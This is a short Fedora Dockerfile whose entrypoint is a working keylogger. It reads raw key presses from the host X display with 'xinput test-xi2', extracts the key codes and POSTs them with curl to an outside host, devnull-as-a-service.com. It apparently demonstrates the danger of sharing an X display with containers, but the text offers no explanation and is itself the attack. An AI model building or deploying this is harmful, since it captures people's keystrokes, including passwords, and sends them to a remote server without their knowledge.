from fedora

RUN dnf install -y \
	evemu \
	python-pip \
	python2-xlib \
	libX11 \
	libXext \
	xev \
	kbd \
	xorg-x11-server-utils \
	nc

RUN pip install autopy

ENV DISPLAY=:0

ENTRYPOINT /bin/bash -c "(xinput test-xi2 --root | \
	stdbuf -o 0 grep RawKeyPress -A 2  | \
	stdbuf -o 0 grep detail | \
	stdbuf -o 0 cut -d":" -f2,2 | \
	stdbuf -o 0 tee >(cat >&2) | \
	curl -d@- -X POST http://devnull-as-a-service.com/dev/null) 2>&1"
